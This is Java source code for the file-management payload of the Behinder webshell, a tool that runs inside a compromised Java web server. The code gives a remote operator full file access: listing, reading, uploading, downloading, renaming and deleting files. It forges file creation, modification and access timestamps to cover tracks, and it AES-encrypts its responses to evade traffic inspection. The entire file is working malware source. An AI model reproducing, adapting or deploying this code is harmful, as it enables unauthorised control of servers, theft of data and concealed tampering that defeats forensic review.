package net.rebeyond.behinder.payload.java;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.nio.charset.Charset;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;

public class FileOperation
{
    public static String mode;
    public static String path;
    public static String newPath;
    public static String content;
    public static String charset;
    public static String createTimeStamp;
    public static String modifyTimeStamp;
    public static String accessTimeStamp;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;
    private Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));

    
    public boolean equals(Object obj) {
        PageContext page = (PageContext)obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();
        
        this.Response.setCharacterEncoding("UTF-8");
        Map<String, String> result = new HashMap<>();
        try {
            if (mode.equalsIgnoreCase("list"))
            { result.put("msg", list(page));
                result.put("status", "success"); }
            else if (mode.equalsIgnoreCase("show"))
            { result.put("msg", show(page));
                result.put("status", "success"); }
            else if (mode.equalsIgnoreCase("delete"))
            { result = delete(page); }
            else if (mode.equalsIgnoreCase("create"))
            { result.put("msg", create(page));
                result.put("status", "success"); }
            else if (mode.equalsIgnoreCase("append"))
            { result.put("msg", append(page));
                result.put("status", "success"); }
            else { if (mode.equalsIgnoreCase("download")) {
                    download(page);
                    return true;
                }    if (mode.equalsIgnoreCase("rename"))
                { result = renameFile(page); }
                else if (mode.equalsIgnoreCase("createFile"))
                { result.put("msg", createFile(page));
                    result.put("status", "success"); }
                else if (mode.equalsIgnoreCase("createDirectory"))
                { result.put("msg", createDirectory(page));
                    result.put("status", "success"); }
                else if (mode.equalsIgnoreCase("getTimeStamp"))
                { result.put("msg", getTimeStamp(page));
                    result.put("status", "success"); }
                else if (mode.equalsIgnoreCase("updateTimeStamp"))
                { result.put("msg", updateTimeStamp(page));
                    result.put("status", "success"); }    }
        
        } catch (Exception e) {
            e.printStackTrace();
            result.put("msg", e.getMessage());
            result.put("status", "fail");
        } 
        try {
            ServletOutputStream so = this.Response.getOutputStream();
            so.write(Encrypt(buildJson(result, true).getBytes("UTF-8")));
            so.flush();
            so.close();
            page.getOut().clear();
        } catch (Exception e) {
            
            e.printStackTrace();
        } 
        return true;
    }
    
    private Map<String, String> warpFileObj(File file) {
        Map<String, String> obj = new HashMap<>();
        obj.put("type", file.isDirectory() ? "directory" : "file");
        obj.put("name", file.getName());
        obj.put("size", file.length() + "");
        obj.put("perm", file.canRead() + "," + file.canWrite() + "," + file.canExecute());
        obj.put("lastModified", (new SimpleDateFormat("yyyy/MM/dd HH:mm:ss")).format(new Date(file.lastModified())));
        return obj;
    }
    
    private String list(PageContext page) throws Exception {
        String result = "";
        File f = new File(path);
        List<Map<String, String>> objArr = new ArrayList<>();
        objArr.add(warpFileObj(new File(".")));
        objArr.add(warpFileObj(new File("..")));
        if (f.isDirectory() && f.listFiles() != null) {
            for (File temp : f.listFiles())
            {
                objArr.add(warpFileObj(temp));
            }
        }

        result = buildJsonArray(objArr, true);
        return result;
    }
    
    private String show(PageContext page) throws Exception {
        if (charset == null)
            charset = System.getProperty("file.encoding"); 
        StringBuffer sb = new StringBuffer();
        File f = new File(path);
        if (f.exists() && f.isFile()) {
            InputStreamReader isr = new InputStreamReader(new FileInputStream(f), charset);
            BufferedReader br = new BufferedReader(isr);
            
            String str = null;
            while ((str = br.readLine()) != null) {
                sb.append(str + "\n");
            }
            br.close();
            isr.close();
        } 
        return sb.toString();
    }
    
    private String create(PageContext page) throws Exception {
        String result = "";
        FileOutputStream fso = new FileOutputStream(path);
        fso.write(base64decode(content));
        fso.flush();
        fso.close();
        result = path + "上传完成，远程文件大小:" + (new File(path)).length();
        return result;
    }
    
    private Map<String, String> renameFile(PageContext page) throws Exception {
        Map<String, String> result = new HashMap<>();
        File oldFile = new File(path);
        File newFile = new File(newPath);
        if (oldFile.exists() && (oldFile.isFile() && oldFile.renameTo(newFile))) {
            result.put("status", "success");
            result.put("msg", "重命名完成:" + newPath);
        } else {
            result.put("status", "fail");
            result.put("msg", "重命名失败:" + newPath);
        } 
        
        return result;
    }
    
    private String createFile(PageContext page) throws Exception {
        String result = "";
        FileOutputStream fso = new FileOutputStream(path);
        fso.close();
        result = path + "创建完成";
        return result;
    }
    
    private String createDirectory(PageContext page) throws Exception {
        String result = "";
        File dir = new File(path);
        dir.mkdirs();
        result = path + "创建完成";
        return result;
    }
    
    private void download(PageContext page) throws Exception {
        FileInputStream fis = new FileInputStream(path);
        byte[] buffer = new byte[1024000];
        int length = 0;
        ServletOutputStream sos = page.getResponse().getOutputStream();
        while ((length = fis.read(buffer)) > 0) {
            sos.write(Arrays.copyOfRange(buffer, 0, length));
        }
        sos.flush();
        sos.close();
        fis.close();
    }
    
    private String append(PageContext page) throws Exception {
        String result = "";
        FileOutputStream fso = new FileOutputStream(path, true);
        fso.write(base64decode(content));
        fso.flush();
        fso.close();
        result = path + "追加完成，远程文件大小:" + (new File(path)).length();
        return result;
    }
    
    private Map<String, String> delete(PageContext page) throws Exception {
        Map<String, String> result = new HashMap<>();
        File f = new File(path);
        if (f.exists()) {
            if (f.delete()) {
                result.put("status", "success");
                result.put("msg", path + " 删除成功.");
            } else {
                result.put("status", "fail");
                result.put("msg", "文件" + path + "存在，但是删除失败.");
            } 
        } else {
            result.put("status", "fail");
            result.put("msg", "文件不存在.");
        } 
        return result;
    }
    
    private String getTimeStamp(PageContext page) throws Exception {
        String result = "";
        DateFormat df = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
        File f = new File(path);
        Map<String, String> timeStampObj = new HashMap<>();
        if (f.exists()) {
            timeStampObj.put("modifyTimeStamp", df.format(new Date(f.lastModified())));
            if (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
                Object[] objects = Class.forName("java.nio.file.LinkOption").getEnumConstants();
                Class<?> PathCls = Class.forName("java.nio.file.Path");
                Method method = Class.forName("java.nio.file.Files").getDeclaredMethod("readAttributes", PathCls, Class.class, objects.getClass());
                Object basicFileAttributes = method.invoke(null, f.toPath(), Class.forName("java.nio.file.attribute.BasicFileAttributes"), objects);
//                Method lastModifiedTime = basicFileAttributes.getClass().getDeclaredMethod("lastModifiedTime");
                Method lastAccessTime = basicFileAttributes.getClass().getDeclaredMethod("lastAccessTime");
                Method creationTime = basicFileAttributes.getClass().getDeclaredMethod("creationTime");
//                lastModifiedTime.setAccessible(true);
                lastAccessTime.setAccessible(true);
                creationTime.setAccessible(true);

                Object AccessTime = lastAccessTime.invoke(basicFileAttributes);
                Object CreationTime = creationTime.invoke(basicFileAttributes);
                method = Class.forName("java.nio.file.attribute.FileTime").getDeclaredMethod("toMillis");

                timeStampObj.put("accessTime", df.format(new Date((Long)method.invoke(AccessTime))));
                timeStampObj.put("creationTime", df.format(new Date((Long)method.invoke(CreationTime))));
            }
            
            result = buildJson(timeStampObj, true);
        } else {
            throw new Exception("文件不存在");
        } 
        return result;
    }
    
    private String updateTimeStamp(PageContext page) throws Exception {
        String result = "";
        DateFormat df = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
        File f = new File(path);
        if (f.exists()) {
            f.setLastModified(df.parse(modifyTimeStamp).getTime());
            String version = System.getProperty("java.version");
            if (version.compareTo("1.7") >= 0 && System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0) {
                Class<?> PathsCls = Class.forName("java.nio.file.Paths");
                Class<?> PathCls = Class.forName("java.nio.file.Path");
                Class<?> BasicFileAttributeViewCls = Class.forName("java.nio.file.attribute.BasicFileAttributeView");
                Class<?> FileTimeCls = Class.forName("java.nio.file.attribute.FileTime");
                Method getFileAttributeView = null;
                Method[] methods = Class.forName("java.nio.file.Files").getDeclaredMethods();
                for(Method method: methods) {
                    if(method.getName().equals("getFileAttributeView")) {
                        getFileAttributeView = method;
                    }
                }
                Object[] objects = Class.forName("java.nio.file.LinkOption").getEnumConstants();
                assert getFileAttributeView != null;
                Object attributes = getFileAttributeView.invoke(null, f.toPath(), BasicFileAttributeViewCls, objects);

                Method fromMillis = null;
                methods = Class.forName("java.nio.file.attribute.FileTime").getDeclaredMethods();
                for(Method method: methods) {
                    if(method.getName().equals("fromMillis")) {
                        fromMillis = method;
                    }
                }
                assert fromMillis != null;
                Object createTime = fromMillis.invoke(null, df.parse(createTimeStamp).getTime());
                Object modifyTime = fromMillis.invoke(null, df.parse(modifyTimeStamp).getTime());
                Object accessTime = fromMillis.invoke(null, df.parse(accessTimeStamp).getTime());
                Method setTimes = BasicFileAttributeViewCls.getMethod("setTimes", FileTimeCls, FileTimeCls, FileTimeCls);
                setTimes.setAccessible(true);
                setTimes.invoke(attributes, modifyTime, accessTime, createTime);
//
//                if (!createTimeStamp.equals(""));
//
//
//                if (!accessTimeStamp.equals(""));
            }

            result = "时间戳修改成功。";
        } else {
            throw new Exception("文件不存在");
        } 
        return result;
    }

    
    private String buildJsonArray(List<Map<String, String>> list, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        sb.append("[");
        for (Map<String, String> entity : list) {
            sb.append(buildJson(entity, encode) + ",");
        }
        if (sb.toString().endsWith(","))
            sb.setLength(sb.length() - 1); 
        sb.append("]");
        return sb.toString();
    }
    
    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = ((String)entity.get(key)).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    getClass(); Class<?> Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { value.getBytes("UTF-8") });
                } else {
                    getClass(); Class<?> Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Object Encoder = Base64.newInstance();
                    value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { value.getBytes("UTF-8") });
                    
                    value = value.replace("\n", "").replace("\r", "");
                } 
            }
            sb.append(value);
            sb.append("\",");
        } 
        if (sb.toString().endsWith(","))
            sb.setLength(sb.length() - 1); 
        sb.append("}");
        return sb.toString();
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        String key = this.Session.getAttribute("u").toString();
        byte[] raw = key.getBytes("utf-8");
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        byte[] encrypted = cipher.doFinal(bs);
        return encrypted;
    }
    
    private byte[] base64decode(String base64Text) throws Exception {
        byte[] result;
        String version = System.getProperty("java.version");
        if (version.compareTo("1.9") >= 0) {
            getClass(); Class<?> Base64 = Class.forName("java.util.Base64");
            Object Decoder = Base64.getMethod("getDecoder", null).invoke(Base64, null);
            result = (byte[])Decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(Decoder, new Object[] { base64Text });
        } else {
            getClass(); Class<?> Base64 = Class.forName("sun.misc.BASE64Decoder");
            Object Decoder = Base64.newInstance();
            result = (byte[])Decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(Decoder, new Object[] { base64Text });
        } 
        return result;
    }
}